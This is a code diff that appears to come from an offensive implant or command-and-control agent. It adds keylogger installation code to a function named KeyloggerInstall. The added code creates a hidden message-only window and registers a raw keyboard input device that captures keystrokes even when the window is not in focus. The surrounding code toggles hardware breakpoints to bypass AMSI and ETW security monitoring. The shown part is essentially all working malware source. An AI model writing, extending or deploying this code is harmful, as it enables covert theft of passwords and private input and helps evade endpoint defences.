@@ -48,13 +48,39 @@ auto DECLFN KeyloggerInstall(
         Hwbp::KeyloggerInit( Instance->Ctx.Bypass );
     }
 
-    //
-    // invoke/execute the dotnet assembly
-    //
-    //
+    // Register a Window class
+    WNDCLASSEX WinClass = { 0 };
+    WinClass.cbSize        = sizeof(WinClass);
+    WinClass.lpfnWndProc   = WndCallback;
+    WinClass.hInstance     = GetModuleHandle(NULL);
+    WinClass.lpszClassName = KEYLOG_CLASS_NAME;
 
-    // desactive hwbp to bypass amsi/etw
-    //
+    if (!Instance->Win32.RegisterClassExW(&WinClass))
+    {
+        DWORD err = NtCurrentTeb()->LastErrorValue;
+        return  KeyloggerCleanup();
+    }
+    
+    WindowHandle = Instance->Win32.CreateWindowExW(0, WinClass.lpszClassName, NULL, 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, Instance->Win32.GetModuleHandle(NULL), NULL);
+    if(! WindowHandle)
+    {
+        return KeyloggerCleanup();
+    }
+
+    RAWINPUTDEVICE RawDevice = { 0 };
+
+    RawDevice.usUsagePage = HID_USAGE_PAGE_GENERIC;      // Generic Desktop Controls
+    RawDevice.usUsage     = HID_USAGE_GENERIC_KEYBOARD; // Keyboard
+    RawDevice.dwFlags     = RIDEV_INPUTSINK;            // Receive input even when not in focus
+    RawDevice.hwndTarget  = WindowHandle;               // Our message-only window
+
+    if (!Instance->Win32.RegisterRawInputDevices(&RawDevice, 1, sizeof(RAWINPUTDEVICE)))
+    {
+        return KeyloggerCleanup();
+    }
+
+
+    // deactive hwbp to bypass amsi/etw
     if ( Instance->Ctx.Bypass ) {
         Hwbp::KeyloggerExit();
     }
